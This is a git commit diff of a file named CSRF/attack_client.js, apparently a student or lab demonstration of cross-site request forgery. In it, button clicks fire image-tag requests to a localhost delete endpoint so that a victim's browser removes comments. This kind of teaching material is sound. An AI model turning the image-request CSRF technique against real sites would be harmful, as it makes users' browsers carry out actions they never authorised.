e7c9d5882266a763ef51e78ca447f1e1e2ff768a
kresges <kresges@oregonstate.edu>
2018-06-12 11:54:20 -0700

    update

--- CSRF/attack_client.js
+++ CSRF/attack_client.js
@@ -3,20 +3,23 @@ console.log("hello from the server?")
 $(document).ready(function(){
 
     $("#first").click(function () {
-        $.get("http://localhost:8000/delete?value=1", function () {
+        (new Image()).src = "http://localhost:8000/delete?value=1";
+        /*$.get("http://localhost:8000/delete?value=1", function () {
             console.log("First Comment Deleted.");
-        });
+        });*/
     });
 
     $("#second").click(function () {
-        $.get("http://localhost:8000/delete?value=2", function () {
+        (new Image()).src = "http://localhost:8000/delete?value=2";
+        /*$.get("http://localhost:8000/delete?value=2", function () {
             console.log("Second Comment Deleted.");
-        });
+        });*/
     });
 
     $("#third").click(function () {
-        $.get("http://localhost:8000/delete?value=3", function () {
+        (new Image()).src = "http://localhost:8000/delete?value=3";
+        /*$.get("http://localhost:8000/delete?value=3", function () {
             console.log("Third Comment Deleted.");
-        });
+        });*/
     });
 });
